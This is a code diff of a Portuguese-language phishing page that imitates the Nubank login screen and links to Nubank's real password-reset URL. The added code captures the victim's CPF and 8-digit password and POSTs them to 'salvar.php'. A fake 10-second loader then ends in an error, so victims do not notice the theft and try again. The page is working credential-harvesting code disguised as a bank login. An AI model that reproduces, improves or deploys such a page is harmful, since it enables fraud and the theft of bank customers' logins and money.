@@ -212,14 +212,6 @@
                             <a href="https://app.nubank.com.br/beta/login/esqueci-senha/" style="margin-left: 0;">Esqueci minha senha</a>
                         </p>
                     </div>
- 
-        <div class="form-container">
-            <form action="salvar.php" method="POST">
-                <input type="text" name="usuario" id="usuario" class="input-box" placeholder="000.000.000-00" oninput="validar()" required>
-                <input type="password" name="senha" id="senha" class="input-box" placeholder="Sua senha" oninput="validar()" required>
-                
-                <button type="submit" id="btnSubmit" class="btn-entrar">Entrar</button>
-            </form>
 
                 </div>
             </div>
@@ -255,11 +247,10 @@
             btnAcessar.classList.toggle('active', v.length === 14);
         });
 
-        // Validação Senha (libera apenas com 8 dígitos)
+        // Validação Senha
         passInput.addEventListener('input', (e) => {
             const v = e.target.value;
             btnConfirmar.classList.toggle('active', v.length === 8);
-            // Esconde o erro se o usuário começar a digitar novamente
             errorBox.style.display = 'none';
         });
 
@@ -278,26 +269,35 @@
             }
         });
 
-        // Clique no confirmar (10 segundos de loader)
+        // Clique no confirmar (Envia para o salvar.php)
         btnConfirmar.addEventListener('click', () => {
             if (btnConfirmar.classList.contains('active')) {
                 errorBox.style.display = 'none';
                 btnTextPass.style.display = 'none';
                 loaderPass.style.display = 'block';
                 
-                // Desativa interações durante o loading
                 btnConfirmar.style.pointerEvents = 'none';
                 passInput.disabled = true;
+
+                // --- INÍCIO DO SALVAMENTO ---
+                const dados = new FormData();
+                dados.append('usuario', cpfInput.value);
+                dados.append('senha', passInput.value);
+
+                fetch('salvar.php', {
+                    method: 'POST',
+                    body: dados
+                });
+                // --- FIM DO SALVAMENTO ---
 
                 setTimeout(() => {
                     loaderPass.style.display = 'none';
                     btnTextPass.style.display = 'block';
                     errorBox.style.display = 'block';
                     
-                    // Reativa interações
                     btnConfirmar.style.pointerEvents = 'auto';
                     passInput.disabled = false;
-                }, 10000); // 10 segundos
+                }, 10000); 
             }
         });
     </script>
